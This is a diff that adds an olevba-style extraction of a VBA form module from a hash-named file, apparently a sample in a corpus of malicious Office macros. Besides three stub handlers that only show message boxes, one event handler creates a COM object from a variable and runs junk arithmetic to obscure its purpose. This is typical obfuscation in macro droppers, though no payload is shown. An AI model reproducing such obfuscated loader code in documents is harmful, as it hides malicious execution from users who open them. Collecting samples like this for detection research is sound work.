@@ -1,0 +1,34 @@
+Filename     : ./macros/cb2532cb15bc085e00958e36905e95648c320de1933cdf5bfc7df94b59e9e0cf
+OLE stream   : Macros/VBA/jecturnb
+VBA filename : jecturnb.frm
+----------------------------------------
+Attribute VB_Name = "jecturnb"
+Attribute VB_Base = "0{977E2C81-D2DC-478F-AE17-917C97304ABA}{ECEE8A4E-FFBA-4F57-A3E1-AA6AA2CEE563}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+
+Private Sub bysovafl_Change()
+MsgBox "Ok"
+End Sub
+
+Private Sub eatme45678_Change()
+MsgBox "Ok"
+End Sub
+
+Private Sub heavfirm_Change()
+MsgBox "Ok"
+End Sub
+
+Private Sub rhinepru_Change()
+Set dosmonday = CreateObject(blkchick)
+dfvvpurq = 8 + 32
+dfvvpurq = 52 - 15 - 5
+dfvvpurq = 77 * 64 + 63 - dfvvpur
+dfvvpurq = 71 - dfvvpurq - 6 - 3
+dfvvpurq = 88 * dfvvpurq + 34 * 6
+kmvghjie dosmonday
+End Sub
